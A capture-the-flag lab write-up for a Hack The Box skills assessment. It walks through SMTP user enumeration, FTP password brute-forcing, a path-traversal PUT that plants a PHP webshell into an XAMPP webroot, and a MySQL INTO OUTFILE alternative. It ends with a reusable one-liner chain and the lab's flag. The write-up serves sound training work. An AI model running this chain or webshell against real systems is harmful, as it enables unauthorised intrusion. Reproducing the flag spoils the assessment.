# Attacking Common Services — Skills Assessment I (Easy)

**Completed:** May 8, 2026
**Flag:** `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`
**Final shell:** `nt authority\system` via PHP webshell on Apache (XAMPP)

---

## Scenario Recap

Single Windows host (`WIN-EASY`) on the `inlanefreight.htb` domain context. Goal: read `C:\Users\Administrator\Desktop\flag.txt`.

## Attack Chain (TL;DR)

```
nmap → smtp-user-enum (RCPT, names.txt, -D inlanefreight.htb) → fiona
hydra rockyou ftp → fiona:987654321
ftp → docs.txt + WebServersInfo.txt (recon: CoreFTP on 21+443, Apache on 80, htdocs at C:\xampp\htdocs\)
curl PUT https://target/../../../xampp/htdocs/shell.php  (Core FTP HTTPS path traversal)
curl http://target/shell.php?c=type+...flag.txt → SYSTEM, flag
```

---

## Step 1 — Recon

```bash
export target=10.129.X.X
nmap -Pn -sC -sV $target
```

Open ports observed:

| Port | Service |
|------|---------|
| 21   | Core FTP Server 2.0 build 725 |
| 25   | hMailServer smtpd (`AUTH LOGIN PLAIN`) |
| 80   | Apache 2.4.53 / PHP 7.4.29 (XAMPP) |
| 443  | Core FTP HTTPS Server (Basic Auth) |
| 587  | hMailServer submission |
| 3306 | MariaDB 10.4.24 |
| 3389 | RDP (NLA off) |

Add to `/etc/hosts`:
```
10.129.X.X inlanefreight.htb
```

## Step 2 — SMTP User Enumeration ⚡ KEY STEP

```bash
smtp-user-enum -M RCPT \
  -U /tmp/htb_lists/users.list \
  -t $target \
  -D inlanefreight.htb
```

Result: `fiona@inlanefreight.htb exists`

> **STUCK NOTE:** If you get 0 results, you are using the WRONG userlist. Role-based names (admin/hr/sales/support/finance) are NOT in this assessment. You MUST use:
> - `/tmp/htb_lists/users.list` (HTB module list, has fiona) — **first choice**
> - `/usr/share/seclists/Usernames/Names/names.txt` (10713 names) — fallback
>
> **Also**: `-D inlanefreight.htb` is mandatory. hMailServer drops RCPT for non-local domains. The domain comes from the assessment scenario text.
>
> **Also**: manual `swaks` RCPT probes fail (server returns 530 demanding AUTH). `smtp-user-enum` works because it sends the full `MAIL FROM` envelope first.

## Step 3 — FTP Password Brute

```bash
hydra -l fiona -P /usr/share/wordlists/rockyou.txt -f ftp://$target
```

Result: `fiona:987654321` (~30 sec)

> **STUCK NOTE:** Don't waste time on `darkweb2017_top-100` — `987654321` is NOT in it. Go straight to **rockyou.txt** for FTP. The HTB module's `/tmp/htb_lists/pws.list` (333 entries) also doesn't contain it; that list is for SMTP/RDP sprays only.
>
> **Don't brute MySQL early.** MariaDB's `max_connect_errors` will ban your VPN IP and kill the SQLi pivot for the rest of the session. Save MySQL for after you have credentials.

## Step 4 — FTP Recon

```bash
ftp $target
# fiona / 987654321
passive          # disable passive (Core FTP weirdness)
ls
get docs.txt
get WebServersInfo.txt
bye
```

`WebServersInfo.txt` reveals the killer info:

```
CoreFTP:
  Directory C:\CoreFTP
  Ports: 21 & 443
  Test Command: curl -k -H "Host: localhost" --basic -u <user>:<pass> https://localhost/docs.txt

Apache:
  Directory "C:\xampp\htdocs\"
  Ports: 80 & 4443
```

So Core FTP HTTPS serves `C:\CoreFTP\` as static files, and Apache serves `C:\xampp\htdocs\`. The two share drive `C:\`.

## Step 5 — Verify Core FTP HTTPS Write (PoC)

```bash
curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 \
  --data-binary "PoC." --path-as-is https://$target/docs.txt
curl -k --basic -u fiona:987654321 https://$target/docs.txt
# → PoC.
```

Confirms PUT writes work.

## Step 6 — Path-Traversal PUT into XAMPP webroot ⚡ KEY STEP

```bash
echo '<?php echo shell_exec($_GET["c"]); ?>' > /tmp/shell.php

curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 \
  --data-binary @/tmp/shell.php --path-as-is \
  "https://$target/../../../xampp/htdocs/shell.php"
```

Expect `HTTP/1.1 201 Created`.

> **STUCK NOTE:** If PUT lands in CoreFTP root (`https://target/shell.php`), Apache won't see it AND Core FTP won't execute PHP — it just serves the source. You MUST traverse out of `C:\CoreFTP\` and back into `C:\xampp\htdocs\`.
>
> Depth: `C:\CoreFTP\` → up 1 to `C:\` → down to `xampp\htdocs\`. Three `../` works because of how Core FTP normalizes the path.
>
> `--path-as-is` is REQUIRED — without it curl collapses the `../` segments client-side.
>
> If 403/401 try the URL-encoded form: `..%2f..%2f..%2fxampp%2fhtdocs%2fshell.php`

## Step 7 — Trigger via Apache (RCE as SYSTEM)

```bash
curl "http://$target/shell.php?c=whoami"
# nt authority\system

curl "http://$target/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"
# HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

Apache (XAMPP) runs as SYSTEM by default — no privesc needed.

---

## Alternative Path #2 — MySQL `INTO OUTFILE`

The flag hint (`t#3r3_4r3_tw0_w4y$`) literally says "two ways". The second:

```bash
mysql -h $target -u fiona -p987654321 --ssl=FALSE -e \
 "SELECT \"<?php echo shell_exec(\$_GET['c']);?>\" INTO OUTFILE 'C:\\\\xampp\\\\htdocs\\\\sh.php';"
```

Requires fiona's FTP password to also be valid for MariaDB (credential reuse — it is). Then trigger `http://$target/sh.php?c=...`. Use this only if Core FTP HTTPS PUT is patched.

---

## What Took Me Down a Rabbit Hole

Burned ~3 hours brute-forcing SMTP and RDP with role-based emails (admin/hr/sales/support/finance @inlanefreight.htb) × `darkweb2017_top-100`. **1386 attempts, 0 hits.**

The mistake: never ran proper `smtp-user-enum` RCPT mode against a real names list. The intended path enumerates `fiona` in **2 seconds** with the right wordlist.

**Forever rule for ACS easy/medium boxes:**
> Username enumeration BEFORE password attack. Always. Names list (or HTB curated `users.list`) BEFORE role list. SMTP RCPT BEFORE SMTP AUTH brute.

---

## Quick-Reference One-Liner

If the box format repeats (CoreFTP + hMailServer + XAMPP), this is the whole chain:

```bash
target=10.129.X.X; domain=inlanefreight.htb
smtp-user-enum -M RCPT -U /tmp/htb_lists/users.list -t $target -D $domain
# → note the user (e.g. fiona)
hydra -l fiona -P /usr/share/wordlists/rockyou.txt -f ftp://$target
# → note the password
echo '<?php echo shell_exec($_GET["c"]); ?>' > /tmp/shell.php
curl -k -X PUT -H "Host: $target" --basic -u fiona:PASS --data-binary @/tmp/shell.php \
  --path-as-is "https://$target/../../../xampp/htdocs/shell.php"
curl "http://$target/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"
```
